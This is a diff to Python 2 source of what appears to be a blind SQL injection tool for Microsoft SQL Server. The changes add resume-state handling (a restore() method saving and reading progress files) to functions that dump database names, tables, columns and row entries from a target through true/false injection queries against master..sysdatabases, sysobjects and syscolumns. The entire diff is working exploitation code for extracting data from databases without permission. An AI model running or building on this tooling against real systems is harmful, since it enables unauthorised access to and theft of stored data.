@@ -233,15 +233,13 @@ class MssqlTrueFalse:
 		else:
 			return request
 
-	def dump(self, request, colonne, r_begin, end):
-		dump=[]
+	def restore(self, request, r_begin, end):
 		m = md5.new()
 		m.update(request)
-		md5_req = m.hexdigest()
+		self.md5_req = m.hexdigest()
 
-
-		if os.path.isfile("dump/" + myInjector.output_dir + "/state_"+md5_req):
-			f=open("dump/" + myInjector.output_dir + "/state_"+md5_req,"r")
+		if os.path.isfile("dump/" + myInjector.output_dir + "/state_"+self.md5_req):
+			f=open("dump/" + myInjector.output_dir + "/state_"+self.md5_req,"r")
 			s_begin, s_end = f.read().split(":")
 			f.close()
 			begin=int(s_begin,10)
@@ -252,21 +250,24 @@ class MssqlTrueFalse:
 		if r_begin!=1:
 			begin=r_begin
 
-		print begin
-		print end
+		return [begin, end]
 
-		f = open("dump/" + self.output_dir + "/dumped_"+md5_req,"a+")
+	def dump(self, request, colonne, begin, end):
+		dump=[]
+
+		f = open("dump/" + self.output_dir + "/dumped_"+self.md5_req,"a+")
 		f.write(request+"\n")
 		f.close()
 		f = open("dump/" + self.output_dir + "/index","a+")
-		f.write(md5_req+" : "+request+"\n")
+		f.write(self.md5_req+" : "+request+"\n")
 		f.close()
+
 		for i in range(begin,end+1):
-			f=open("dump/" + self.output_dir + "/state_"+md5_req,"w")
+			f=open("dump/" + self.output_dir + "/state_"+self.md5_req,"w")
 			f.write(str(i)+":"+str(end))
 			f.close()
 			entrie = self.value(request,colonne, i)
-			f=open("dump/" + self.output_dir + "/dumped_"+md5_req,"a+")
+			f=open("dump/" + self.output_dir + "/dumped_"+self.md5_req,"a+")
 			f.write("line " + str(i) + " : "+entrie+"\n")
 			f.close()
 			dump.append(entrie)
@@ -294,6 +295,7 @@ class MssqlTrueFalse:
 
 	def dumpDB(self, begin = 1, end = 0, condition=""):
 		request=self.conditionRequest("select distinct(name) from master..sysdatabases",condition)
+		begin, end = self.restore(request,begin,end)
 		if end==0:
 			end=self.countDB(condition)
 		print "There is %d databases with condition : %s"%(end,condition)
@@ -305,6 +307,7 @@ class MssqlTrueFalse:
 
 	def dumpTables(self, database, begin = 1, end = 0, condition=""):
 		request=self.conditionRequest("select distinct(name) from " + database + "..sysobjects where xtype = char(0x55)",condition)
+		begin, end = self.restore(request,begin,end)
 		if end==0:
 			end=self.countTables(database, condition)
 		print "There is %d tables in %s with condition : %s"%(end,database,condition)
@@ -312,12 +315,13 @@ class MssqlTrueFalse:
 
 	def countColumns(self,database,table,condition=""):
 		#request=self.conditionRequest("select count(distinct(master..syscolumns.name)) as cname from master..syscolumns, master..sysobjects where master..syscolumns.id=master..sysobjects.id and master..sysobjects.name='" + table + "'",condition)
-		request=self.conditionRequest("select count(distinct(name)) from syscolumns where id = (select id from sysobjects where name = '"+ table +"')",condition)
+		request=self.conditionRequest("select count(distinct(name)) from " + database + "..syscolumns where id = (select id from "+database+"..sysobjects where name = '"+ table +"')",condition)
 		return self.count(request)
 
 	def dumpColumns(self, database, table, begin = 1, end = 0, condition=""):
 		#request=self.conditionRequest("select distinct(master..syscolumns.name) as cname from master..syscolumns, master..sysobjects where master..syscolumns.id=master..sysobjects.id and master..sysobjects.name='" + table + "'",condition)
-		request=self.conditionRequest("select distinct(name) from syscolumns where id = (select id from sysobjects where name = '"+ table +"')",condition)
+		request=self.conditionRequest("select distinct(name) from " + database + "..syscolumns where id = (select id from " + database + "..sysobjects where name = '"+ table +"')",condition)
+		begin, end = self.restore(request,begin,end)
 		if end==0:
 			end=self.countColumns(database, table, condition)
 		print "There is %d columns in %s.%s with condition : %s"%(end,database,table,condition)
@@ -328,11 +332,12 @@ class MssqlTrueFalse:
 		return self.count(request)
 
 	def dumpEntries(self, database, table, column, begin = 1, end = 0, condition=""):
-		request=self.conditionRequest("select distinct("+column+") from "+database+".."+table,condition)
+		request=self.conditionRequest("select distinct("+column+") as name from "+database+".."+table,condition)
+		begin, end = self.restore(request,begin,end)
 		if end==0:
 			end=self.countEntries(database, table, column, condition)
 		print "There is %d entries in %s.%s, column %s with condition : %s"%(end,database,table,column,condition)
-		return self.dump(request,begin,end)
+		return self.dump(request,"name",begin,end)
 
 	def getStat(self):
 		return self.stat
